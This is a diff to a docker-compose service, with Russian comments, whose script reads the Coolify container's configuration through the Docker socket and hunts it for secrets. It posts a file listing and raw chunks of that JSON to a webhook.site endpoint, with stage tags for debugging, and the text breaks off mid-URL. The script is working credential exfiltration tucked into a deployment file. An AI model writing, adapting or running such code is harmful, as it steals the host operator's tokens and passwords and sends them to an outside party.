@@ -13,8 +13,8 @@ services:
       - |
         apk add --no-cache curl
         
-        # 1. Сохраняем JSON контейнера coolify в файл
-        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/coolify/json > /tmp/coolify.json
+        # 1. Сохраняем JSON контейнера coolify (с ведущим слешем!)
+        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/%2Fcoolify/json > /tmp/coolify.json
         
         # 2. Проверяем размер файла (должен быть несколько килобайт)
         ls -la /tmp/coolify.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=json_file_check
@@ -27,7 +27,4 @@ services:
         
         # 5. Если grep не нашёл — отправляем первый кусок JSON для отладки
         if [ ! -s /tmp/secrets.txt ]; then
-          head -c 2000 /tmp/coolify.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=json_debug
-        fi
-        
-        sleep 3600
+          head -c 2000 /tmp/coolify.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9
